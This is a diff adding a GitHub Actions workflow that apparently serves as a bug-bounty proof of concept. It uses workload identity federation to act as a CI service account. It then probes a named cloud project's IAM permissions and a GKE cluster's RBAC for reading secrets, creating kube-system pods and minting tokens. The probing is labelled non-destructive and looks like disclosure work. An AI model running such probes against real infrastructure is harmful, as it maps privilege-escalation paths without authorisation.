@@ -1,0 +1,90 @@
+# Copyright 2026 Google LLC
+#
+# Licensed under the Apache License, Version 2.0 (the "License");
+# you may not use this file except in compliance with the License.
+# You may obtain a copy of the License at
+#
+#      http://www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing, software
+# distributed under the License is distributed on an "AS IS" BASIS,
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# See the License for the specific language governing permissions and
+# limitations under the License.
+
+name: VRP direct fork WIF canary
+
+on:
+  push:
+    branches:
+    - vrp-direct-wif
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  id-token: write
+
+jobs:
+  direct-wif-canary:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 5
+    steps:
+    - uses: actions/checkout@v7
+    - id: auth
+      uses: google-github-actions/auth@v3
+      with:
+        workload_identity_provider: projects/816257685787/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider
+        service_account: github-action-runner@online-boutique-ci.iam.gserviceaccount.com
+    - uses: google-github-actions/setup-gcloud@v2
+      with:
+        install_components: gke-gcloud-auth-plugin
+    - name: Non-destructive identity, IAM, and Kubernetes authorization receipt
+      shell: bash
+      run: |
+        set -euo pipefail
+        set +x
+        echo "VRP_DIRECT_WIF_CANARY_BEGIN"
+        echo "active_gcloud_account=$(gcloud auth list --filter=status:ACTIVE --format='value(account)' | head -n 1)"
+
+        response_file="$(mktemp)"
+        access_token="$(gcloud auth print-access-token)"
+        trap 'rm -f "$response_file"; unset access_token' EXIT
+        http_status="$(curl --silent --show-error --max-time 20 \
+          --output "$response_file" --write-out '%{http_code}' \
+          --request POST \
+          --header "Authorization: Bearer ${access_token}" \
+          --header 'Content-Type: application/json' \
+          --data '{"permissions":["resourcemanager.projects.getIamPolicy","resourcemanager.projects.setIamPolicy","container.clusters.get","container.clusters.update","container.clusters.delete","container.clusters.create","artifactregistry.repositories.list","storage.buckets.list","iam.serviceAccounts.list","cloudbuild.builds.create"]}' \
+          'https://cloudresourcemanager.googleapis.com/v1/projects/online-boutique-ci:testIamPermissions')"
+        allowed="$(python3 - "$response_file" <<'PY'
+        import json
+        import sys
+        try:
+            with open(sys.argv[1], encoding="utf-8") as response_file:
+                response = json.load(response_file)
+        except (OSError, ValueError):
+            response = {}
+        print(",".join(sorted(response.get("permissions", []))) or "none")
+        PY
+        )"
+        echo "iam_project_http=${http_status}"
+        echo "iam_project_allowed=${allowed}"
+        unset access_token
+
+        gcloud container clusters get-credentials prs-gke-cluster \
+          --region us-central1 --project online-boutique-ci
+        echo "kube_context=$(kubectl config current-context)"
+
+        can_i() {
+          local label="$1"
+          shift
+          local decision
+          decision="$(kubectl auth can-i "$@" 2>&1)" || true
+          echo "rbac_${label}=${decision}"
+        }
+        can_i create_namespaces create namespaces
+        can_i get_all_namespace_secrets get secrets --all-namespaces
+        can_i create_kube_system_pods create pods --namespace kube-system
+        can_i create_cluster_role_bindings create clusterrolebindings.rbac.authorization.k8s.io
+        can_i mint_kube_system_serviceaccount_tokens create serviceaccounts/token --namespace kube-system
+        echo "VRP_DIRECT_WIF_CANARY_END"
